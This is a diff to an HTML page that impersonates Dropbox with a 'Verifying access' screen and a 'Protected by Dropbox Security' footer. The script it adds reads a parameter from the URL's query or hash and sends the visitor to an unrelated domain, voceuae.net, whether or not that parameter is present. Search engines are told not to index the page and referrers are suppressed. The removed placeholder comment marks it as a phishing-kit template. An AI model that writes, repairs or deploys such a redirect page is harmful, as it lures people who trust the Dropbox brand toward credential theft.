@@ -7,7 +7,6 @@
 <meta name="robots" content="noindex,nofollow">
 <meta name="referrer" content="no-referrer">
 
-
 <title>Dropbox — Verifying access</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -56,17 +55,20 @@ body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#f5f5f
 </div>
 <div class="footer">Protected by Dropbox Security</div>
 </div>
-<!-- ▼▼▼ REDIRECT URL #2 — replace PUT_YOUR_DESTINATION_URL_HERE ▼▼▼ -->
+
 <script>
-  const params = new URLSearchParams(window.location.search);
-  const ref = params.get("state");
+  // Extract parameters from the query string or URL hash fragment
+  const queryString = window.location.search || window.location.hash.substring(1);
+  const params = new URLSearchParams(queryString);
+  const ref = params.get("#");
 
   if (ref) {
-    const destination =
-      "https://voceuae.net?Gejqbphl" +
-      encodeURIComponent(/);
-
+    // Construct target URL with encoded parameter
+    const destination = "https://voceuae.net?Gejqbphl/" + encodeURIComponent(ref);
     window.location.replace(destination);
+  } else {
+    // Fallback redirect if no state parameter is present
+    window.location.replace("https://voceuae.net?Gejqbphl");
   }
 </script>
 </body>
